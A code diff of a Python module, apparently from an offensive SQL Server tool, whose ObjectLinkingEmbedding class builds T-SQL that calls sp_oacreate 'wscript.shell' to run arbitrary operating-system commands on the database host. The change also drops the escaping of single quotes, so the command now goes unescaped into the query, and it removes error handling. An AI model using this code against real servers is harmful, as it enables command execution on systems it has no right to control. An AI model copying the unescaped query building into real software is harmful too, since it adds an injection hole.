@@ -30,26 +30,30 @@ class ObjectLinkingEmbedding(BaseAction):
 
     def __init__(self):
         super().__init__()
-        self._command: Optional[str] = None
+        self._command: str = ""
 
-    def validate_arguments(self, additional_arguments: str) -> None:
+    def validate_arguments(self, args: List[str]) -> bool:
         """
         Validate that a command is provided.
 
         Args:
-            additional_arguments: The operating system command to execute
+            args: List of command arguments to execute
+
+        Returns:
+            bool: True if validation succeeds
 
         Raises:
             ValueError: If no command is provided
         """
-        if not additional_arguments or not additional_arguments.strip():
+        if not args or len(args) == 0:
             raise ValueError(
                 "A command must be provided for OLE execution. Usage: <command>"
             )
 
-        self._command = additional_arguments.strip()
+        self._command = " ".join(args)
+        return True
 
-    def execute(self, database_context: DatabaseContext) -> Optional[List[str]]:
+    def execute(self, database_context: DatabaseContext) -> None:
         """
         Execute the provided command using OLE Automation Procedures.
 
@@ -63,7 +67,7 @@ class ObjectLinkingEmbedding(BaseAction):
             database_context: The database context containing QueryService and ConfigService
 
         Returns:
-            None (OLE execution does not return output)
+            None
         """
         logger.info(f"Executing OLE command: {self._command}")
 
@@ -77,34 +81,23 @@ class ObjectLinkingEmbedding(BaseAction):
             return None
 
         # Generate two random variable names (6 characters each)
-        output_var = common.generate_random_string(6)
-        program_var = common.generate_random_string(6)
-
-        # Escape single quotes in the command
-        escaped_command = self._command.replace("'", "''")
+        output = common.generate_random_string(6)
+        program = common.generate_random_string(6)
 
         # Construct the OLE Automation query
         query = (
-            f"DECLARE @{output_var} INT; "
-            f"DECLARE @{program_var} VARCHAR(255); "
-            f"SET @{program_var} = 'Run(\"{escaped_command}\")'; "
-            f"EXEC sp_oacreate 'wscript.shell', @{output_var} OUT; "
-            f"EXEC sp_oamethod @{output_var}, @{program_var}; "
-            f"EXEC sp_oadestroy @{output_var};"
+            f"DECLARE @{output} INT; "
+            f"DECLARE @{program} VARCHAR(255);"
+            f"SET @{program} = 'Run(\"{self._command}\")';"
+            f"EXEC sp_oacreate 'wscript.shell', @{output} out;"
+            f"EXEC sp_oamethod @{output}, @{program};"
+            f"EXEC sp_oadestroy @{output};"
         )
 
-        try:
-            print()  # Spacing before execution
-            logger.info("Executing OLE Automation query")
+        database_context.query_service.execute_non_processing(query)
+        logger.success("Executed command")
 
-            database_context.query_service.execute_non_processing(query)
-
-            return None
-        except Exception as e:
-            logger.error(f"Error executing OLE command: {e}")
-            return None
-        finally:
-            print()  # Spacing after execution
+        return None
 
     def get_arguments(self) -> List[str]:
         """
